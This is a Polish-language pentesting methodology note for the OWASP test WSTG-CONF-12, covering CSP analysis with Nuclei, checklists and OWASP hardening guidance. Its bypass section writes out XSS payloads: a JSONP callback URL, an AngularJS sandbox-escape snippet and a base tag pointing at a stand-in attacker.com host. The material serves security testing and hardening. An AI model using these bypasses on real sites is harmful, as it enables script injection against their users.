# WSTG-CONF-12 — Testing for Content Security Policy

## Cel

Analiza nagłówka Content-Security-Policy: brak CSP, słabe dyrektywy (`unsafe-inline`/`unsafe-eval`/`*`), wildcardy w whitelist hostów, missing `object-src`/`frame-ancestors`/`base-uri`. CSP to last-line-of-defense przeciwko XSS — słaba CSP eliminuje tę ochronę.

## Automatyzacja Nuclei

### Nasz dedykowany szablon

```bash
nuclei -l burp-export.xml -im burp \
       -t templates/wstg-conf-12-csp.yaml \
       -proxy http://127.0.0.1:8080 \
       -o results/wstg-conf-12.jsonl
```

Szablon w jednym requeście z 9 matcherami: brak CSP, tylko Report-Only (no enforcement), `unsafe-inline`, `unsafe-eval`, wildcard w script-src, wildcard w default-src, `data:` w script-src, brak object-src, brak frame-ancestors, JSONP-bypassable hosts (googleapis, jsdelivr).

### Dodatkowe oficjalne szablony Nuclei

```bash
# Security headers misconfiguration (zawiera CSP)
nuclei -l burp-export.xml -im burp \
       -t resources/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml

# Nasz szablon CONF-14 dla pełnego security headers (CSP + reszta)
nuclei -l burp-export.xml -im burp \
       -t templates/wstg-conf-14-security-headers.yaml
```

### Suplementarne narzędzia (kluczowe dla CSP)

```bash
# Google CSP Evaluator - pełna analiza
# https://csp-evaluator.withgoogle.com/

# CSP Evaluator CLI
csp-evaluator --csp "default-src 'self' 'unsafe-inline'; script-src *"

# Browse to https://csp-scanner.com/ for ready URL test
```

## Coverage Matrix

| Wymiar | Pokryte | Nie pokryte |
|---|---|---|
| CSP brak | ✓ | — |
| Report-Only without enforcing | ✓ | — |
| unsafe-inline / unsafe-eval | ✓ | — |
| Wildcard `*` w script-src/default-src | ✓ | — |
| `data:` jako script source | ✓ | — |
| Brak object-src | ✓ | — |
| Brak frame-ancestors | ✓ | — |
| JSONP bypass-able hosts (googleapis, jsdelivr) | ✓ | dodatkowe → Google CSP Evaluator |
| Nonce reuse detection | — | wymaga 2 requestów (manual) |
| strict-dynamic missing dla nonce-CSP | — | manual (false positive risk) |
| `base-uri` missing | częściowe | osobno → CONF-14 |

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (5 kroków)

1. **Baseline pull**: GET `/` + ekstrakcja CSP (Content-Security-Policy + Report-Only).
2. **Google CSP Evaluator**: paste header → analiza per-directive (HIGH/MEDIUM/LOW findings).
3. **Whitelisted host JSONP analysis**: dla każdego whitelisted host w script-src, sprawdzić znane JSONP endpoints (np. `https://www.googleapis.com/customsearch/v1?callback=alert(1)`).
4. **Nonce/hash analysis**: jeśli nonce-based CSP, sprawdzić czy nonces są random per request (nie reuse).
5. **CSP bypass via specific gadgets**: AngularJS sandbox escape, JSONP, base-href injection.

### Co MUSI być sprawdzone (12 punktów)

- [ ] CSP header obecny (Content-Security-Policy)
- [ ] CSP enforcing (nie Report-Only)
- [ ] `unsafe-inline` w script-src/default-src
- [ ] `unsafe-eval` w script-src/default-src
- [ ] Wildcard `*` w script-src
- [ ] `data:` jako allowed source
- [ ] Brak object-src 'none' (legacy Flash/Java)
- [ ] Brak frame-ancestors (clickjacking)
- [ ] Brak base-uri (base tag injection)
- [ ] Brak form-action (form hijacking)
- [ ] JSONP-bypassable hosts (googleapis, jsdelivr, unpkg, jsonp services)
- [ ] Google CSP Evaluator wynik

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Content_Security_Policy_Cheat_Sheet.md

### Strict CSP — rekomendowane podejście

- **Nonce-based**: `script-src 'nonce-{random}'` — losowy nonce per request, TYLKO skrypty z tym nonce są wykonywane
- **Hash-based**: `script-src 'sha256-{hash}'` — TYLKO skrypty z dokładnym hashem są wykonywane
- Nonce/hash approach jest SILNIEJSZY niż allowlist domen — eliminuje wiele bypass technik

### Niebezpieczne dyrektywy (UNIKAJ)

- `unsafe-inline` — pozwala na inline `<script>` i `on*` event handlers — czyni XSS możliwym
- `unsafe-eval` — pozwala na `eval()`, `Function()`, `setTimeout(string)` — otwiera drogę do code injection
- `*` (wildcard) — pozwala na ładowanie z dowolnej domeny — praktycznie brak ochrony
- `data:` w `script-src` — pozwala na `<script src="data:text/javascript,alert(1)">`
- Domeny CDN (`*.googleapis.com`, `*.cloudflare.com`) — atakujący może hostować JS na tych CDN

### Kluczowe dyrektywy CSP

- `default-src 'none'` — deny by default, potem allowlist per typ
- `script-src 'nonce-{random}'` — inline skrypty tylko z nonce
- `style-src 'self'` — CSS tylko z tej samej domeny
- `img-src 'self' data:` — obrazy z tej samej domeny + data URI
- `frame-ancestors 'none'` — blokuje iframe embedding (zastępuje X-Frame-Options)
- `base-uri 'self'` — zapobiega base tag injection
- `form-action 'self'` — formularze mogą być wysyłane tylko na tę samą domenę
- `object-src 'none'` — blokuje Flash, Java, inne pluginy

### Wdrożenie CSP

- **Krok 1**: `Content-Security-Policy-Report-Only` — testuj bez blokowania
- **Krok 2**: Monitoruj raporty (`report-uri /csp-report`) — identyfikuj co by było zablokowane
- **Krok 3**: Napraw naruszenia (usuń inline scripts, użyj nonce)
- **Krok 4**: Włącz enforcing: `Content-Security-Policy` (bez Report-Only)
- Ustaw CSP na WSZYSTKICH stronach — nie tylko na wybranych

### CSP Bypass — co testować

- Czy dozwolone domeny hostują kontrolowany content (CDN, cloud storage)
- Czy `unsafe-inline` lub `unsafe-eval` są włączone
- Czy brak `base-uri` (base tag injection)
- Czy brak `frame-ancestors` (clickjacking)
- Czy CSP jest Report-Only zamiast enforcing

## Pentesterskie deep dive

### Mniej znane techniki

- **JSONP bypass**: `script-src https://www.googleapis.com` → `<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">` wykonuje arbitrary JS. Wszystkie znane JSONP endpoints zebrane na: https://github.com/zigoo0/JSONBee
- **AngularJS sandbox escape**: jeśli `script-src https://ajax.googleapis.com/ajax/libs/angularjs/`, atakujący ładuje starą wersję Angular z sandbox escape (np. 1.5.x): `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.6/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>`.
- **base-href injection bez base-uri**: `<base href="//attacker.com/">` zmienia relative URLs → wszystkie relative scripts ładują się z attacker.
- **CSP nonce reuse**: jeśli ten sam nonce dla GET i POST response → atakujący może replay'ować z dowolnego endpointu.
- **strict-dynamic + brak nonce w response**: `strict-dynamic` polega na nonce; jeśli nonce missing dla niektórych scripts, są blocked → developers wyłączają strict-dynamic.
- **CSP via meta tag injection**: jeśli `script-src 'self'` ale aplikacja pozwala na HTML injection w `<head>`, atakujący wstrzykuje `<meta http-equiv="Content-Security-Policy" content="...">` rozluźniając CSP.

### Common pitfalls

- **CSP Report-Only mylony z enforcing**: `Content-Security-Policy-Report-Only` nie blokuje, tylko raportuje. Częste w prod gdy team boi się włączyć enforcing.
- **CSP w meta tag tylko na pierwszej response**: `<meta http-equiv="CSP">` działa tylko dla initial load — dynamiczne pages bez header są bez ochrony.
- **CSP nie chroni przed extension injection**: browser extensions mogą injectować skrypty omijając CSP — out-of-scope dla server-side defense.

### Świeżynki z research

- **JSONBee** (kompletna lista CSP-bypass JSONP endpoints): https://github.com/zigoo0/JSONBee
- **Google CSP Evaluator** (pełna analiza): https://csp-evaluator.withgoogle.com/
- **CSP-Scanner** (ready URL test): https://csp-scanner.com/
- **PortSwigger CSP labs**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- **HackTricks CSP Bypass**: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

## Rozszerzenia Burp Suite

| Rozszerzenie | Opis | Link |
|---|---|---|
| CSP-Auditor | Pasywna analiza CSP w odpowiedziach | community ext |
| Hackvertor | Decode/test CSP nonces | [GitHub](https://github.com/PortSwigger/hackvertor) |

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy
- OWASP CSP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- JSONBee: https://github.com/zigoo0/JSONBee
- HackTricks CSP Bypass: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- PortSwigger CSP: https://portswigger.net/web-security/cross-site-scripting/content-security-policy

### Wskazówki ASVS

| ID | Sekcja | Wymaganie |
|---|---|---|
| V14.4.3 | Configuration (L1) | CSP set in deny by default and uses nonce or hash. |
| V14.4.4 | Configuration (L2) | All responses contain a Content-Security-Policy header. |
